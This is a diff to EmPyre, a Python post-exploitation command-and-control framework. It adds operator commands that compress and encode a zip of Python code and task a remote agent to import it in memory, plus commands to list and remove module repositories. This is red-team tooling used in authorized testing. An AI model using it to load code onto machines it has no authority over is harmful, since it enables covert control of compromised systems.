@@ -16,6 +16,7 @@ from pydispatch import dispatcher
 import sys, cmd, sqlite3, os, hashlib, traceback, time
 from zlib_wrapper import compress
 from zlib_wrapper import decompress
+import zipfile
 
 # EmPyre imports
 import helpers
@@ -1621,6 +1622,46 @@ class AgentMenu(cmd.Cmd):
     # def do_updateprofile(self, line):
     #     "Update an agent connection profile."
     #     # TODO: implement
+
+    def do_loadpymodule(self, line):
+        "Import a python module from memory. Provide a path to a single py file or a module folder with an __init__.py. To load multiple modules, place all module folders in a single directory"
+        path = line.strip()
+
+        if path != "" and os.path.exists(path):
+            if os.path.splitext(path)[-1] == '.zip' and os.path.isfile(path):
+
+                zipname = os.path.basename(path)
+                open_file = open(path,'rb')
+                module_data = open_file.read()
+                open_file.close()
+                print helpers.color("[*] Starting size of %s for upload and import: %s" %(path, helpers.get_file_size(module_data)), color="green")
+                msg = "Tasked agent to import "+path+" : " + hashlib.md5(module_data).hexdigest()
+                self.mainMenu.agents.save_agent_log(self.sessionID, msg)
+                c = compress.compress()
+                start_crc32 = c.crc32_data(module_data)
+                comp_data = c.comp_data(module_data, 9)
+                module_data = c.build_header(comp_data, start_crc32)
+                print helpers.color("[*] Final tasked size of %s for import: %s" %(path, helpers.get_file_size(module_data)), color="green")
+                module_data = helpers.encode_base64(module_data)
+                data = zipname + "|" + module_data
+                self.mainMenu.agents.add_agent_task(self.sessionID, "TASK_MODULE_IMPORT", data)
+            else:
+                print helpers.color("[!] Unable to locate zip compressed module")
+        else:
+            print helpers.color("[!] Please enter a valid module path")
+
+    def do_listrepos(self, line):
+        "View all of the currently modules in the empire repository"
+        self.mainMenu.agents.add_agent_task(self.sessionID, "TASK_MODULE_VIEW")
+
+    def do_removerepo(self, line):
+        "Remove a module repo."
+        repoName = line.strip()
+        self.mainMenu.agents.add_agent_task(self.sessionID, "TASK_MODULE_REMOVE", repoName)
+
+    def complete_loadpymodule(self, text, line, begidx, endidx):
+        "Tab-complete a module import file path"
+        return helpers.complete_path(text, line)
 
     def complete_usemodule(self, text, line, begidx, endidx):
         "Tab-complete an EmPyre Python module path"
